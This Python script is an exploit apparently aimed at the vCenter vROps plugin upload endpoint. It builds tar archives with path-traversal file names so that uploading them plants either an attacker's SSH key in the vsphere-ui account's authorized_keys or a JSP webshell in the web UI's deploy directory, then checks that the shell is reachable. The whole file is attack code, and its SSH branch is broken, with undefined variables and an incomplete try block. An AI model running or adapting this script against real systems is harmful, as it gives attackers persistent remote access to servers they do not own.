import tarfile
import os
from io import BytesIO
import requests
import argparse

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def return_sshzip(targeturl):
    with tarfile.open("test.tar", 'w') as tar:
        payload = BytesIO()
        key = open('id_rsa','r')
        id_rsa_pub= key.read()
        key.close()
        tarinfo = tarfile.TarInfo(name='../../../../../../../../../../../home/vsphere-ui/.ssh/authorized_keys')
        f1 = BytesIO(id_rsa_pub.encode())
        tarinfo.size = len(f1.read())
        f1.seek(0)
        tar.addfile(tarinfo, fileobj=f1)
        tar.close()
        payload.seek(0)
        try:
            r = requests.post(url=url, files=files,verify = False).text
            print(r)
        
def return_jspzip(url,checkurl):
    file = open('3.jsp','r')
    shell = file.read()
    file.close()
    for i in range(0,100):
        with tarfile.open('test.tar', 'a') as tar:
            payload = BytesIO()
            
            dir = '../../../../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{0}/0/h5ngc.war/resources/js.jsp'.format(i)
            tarinfo = tarfile.TarInfo(name=dir)
            f1 = BytesIO(shell.encode())
            print(i)
            tarinfo.size = len(f1.read())
            f1.seek(0)
            tar.addfile(tarinfo, fileobj=f1)
            tar.close()
            payload.seek(0)
            test = open('test.tar','rb')
            files = {'uploadFile':test}
            #print_r(files)
            try:
                r = requests.post(url=url, files=files,verify = False).text
                print(r)
                check = requests.get(url=checkurl,verify = False)
                
                if check.status_code == 200:
                    break
                
            except IOError as e:
                raise e     
            test.close()
            os.remove('test.tar')
        



if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url' ,type=str, default='http://127.0.0.1/',
                        help="测试的URL")
    parser.add_argument('-s', '--switch',type=str, default='ssh',help="选择webshell或者ssh")
    args = parser.parse_args()
    try:
        targeturl= args.url+"ui/vropspluginui/rest/services/uploadova"
        checkurl= args.url+"ui/resources/js.jsp"
        #print(targeturl)
        if args.switch=='webshell':
            return_jspzip(targeturl,checkurl)

        elif args.switch == 'ssh':
            return_sshzip(targeturl)
        
        else :
            print("failed")
    except IOError as e:
        raise e
        
        
        

        
